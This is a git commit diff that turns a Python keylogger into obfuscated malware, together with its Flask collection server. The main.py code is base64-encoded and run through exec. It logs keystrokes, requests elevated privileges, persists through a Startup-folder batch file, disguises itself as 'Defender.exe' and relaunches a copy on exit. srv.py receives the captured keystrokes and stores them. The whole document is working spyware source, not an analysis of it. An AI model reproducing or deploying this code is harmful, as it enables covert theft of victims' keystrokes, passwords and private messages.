abe8fdb33c4e26593275daf1ecda0bd07ae18cb8
DATK <pasha.dark.dog@gmial.com>
2023-12-20 11:50:17 +0300

    fixes

--- main.py
+++ main.py
@@ -1,36 +1,90 @@
+import base64
 import keyboard as kb
 import requests
+from elevate import elevate    
+import sys
+import os
+code = base64.b64encode(b"""
+
+NAME_FLS="mian.exe"                       
+SERVER="http://127.0.0.1:5000/getin/it/data"
+Name_file="Defender.exe"
+BAT=f"start C:/Users/Pavel/AppData/Local/Temp/{Name_file}"
+PATH_BAT=r"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/Windows_Defender.bat"
+PATH_COPY=f"C:/Users/Pavel/AppData/Local/Temp/{Name_file}"
+SERVER2="http://127.0.0.1:5000/connect"
+
+MY_NAME=sys.argv[0]
+  
 
 class Steal:
-    
-    def __init__(self,server="http://127.0.0.1:5000/getin/it/data"):
-        self.server=server
-        self.data=[]
-        self.bug=[]
-        self.limit=100
-        
+
+    def __init__(self, server=SERVER):
+        self.server = server
+        self.data = []
+        self.bug = []
+        self.limit = 100
+        self.path_to=PATH_COPY
+        if not (Name_file == NAME_FLS):
+            elevate()
+            self.write_in_autoload()
+            self.create_copy()
+
     def get_key(self):
         return kb.read_key()
     
-    def send(self):
-        
+    def write_in_autoload(self):
         try:
-            requests.post(self.server,json={"data":self.data})
-            if self.bug!=[]:
-                requests.post(self.server,json={"data":self.bug})
-                self.bug.clear()
+            with open(PATH_BAT,"w",encoding="UTF-8") as f:
+                f.write(self.path_to)
+        except PermissionError:
+            pass
+        
+    def create_copy(self,way=PATH_COPY):
+        try:
+            with open(MY_NAME,"rb") as f:
+                fil=f.read()
+            with open(way,"wb") as f:
+                f.write(fil)
         except:
-            self.bug.extend(self.data)
+            pass
     
+    def connect_server(self):
+        try:
+            if requests.get(SERVER2):
+                return 1
+            else:
+                return 0
+        except:
+            return 0
+                    
+    
+    def send(self):
+        if self.connect_server():
+            if self.bug!=[]:
+                requests.post(self.server, json={"data": self.bug})
+                self.bug.clear()
+                self.data.clear()
+            elif len(self.data)>=self.limit:
+                requests.post(self.server, json={"data": self.data})
+                self.data.clear()
+            else:
+                return 1
+        else:
+            self.bug.extend(self.data)
+
     def run(self):
         while True:
-            if len(self.data) >= self.limit:
-                self.send()
-                self.data.clear()
-                
+            self.send()
             self.data.append(self.get_key())
             
-            
-
-app = Steal()
-app.run()
+    def __del__(self):
+        self.create_copy("C:/Users/Pavel/AppData/Roaming/NO.exe")
+        os.system("start C:/Users/Pavel/AppData/Roaming/NO.exe")
+        
+        
+if __name__=="__main__":
+    app = Steal()
+    app.run()
+""")
+exec(base64.b64decode(code))
--- srv.py
+++ srv.py
@@ -1,28 +1,33 @@
-from flask import Flask,request
+from flask import Flask, request
 import json
+
+
+dbg = False
+
 
 def write(js):
     try:
-        with open("data.json","r",encoding="UTF-8") as f:
-            tmp=json.load(f)
+        with open("data.json", "r", encoding="UTF-8") as f:
+            tmp = json.load(f)
         tmp["data"].extend(js["data"])
     except:
         return "bad"
-    with open("data.json","w",encoding="UTF-8") as f:
-        json.dump(tmp,f)
+    with open("data.json", "w", encoding="UTF-8") as f:
+        json.dump(tmp, f)
     return "sucs"
 
-app=Flask(__name__)
 
-@app.route("/getin/it/data",methods=["POST"])
-def get():                                                    
-    data=request.json
-    print(data)
+app = Flask(__name__)
+
+
+@app.route("/getin/it/data", methods=["POST"])
+def get():
+    data = request.json
+    # print(data)
     return write(data)
-    
-    
-app.run(debug=True,host="0.0.0.0")
-        
-        
-        
-        
+
+@app.route("/connect", methods=["GET"])
+def get1():
+    return "q"
+
+app.run(debug=dbg, host="0.0.0.0")
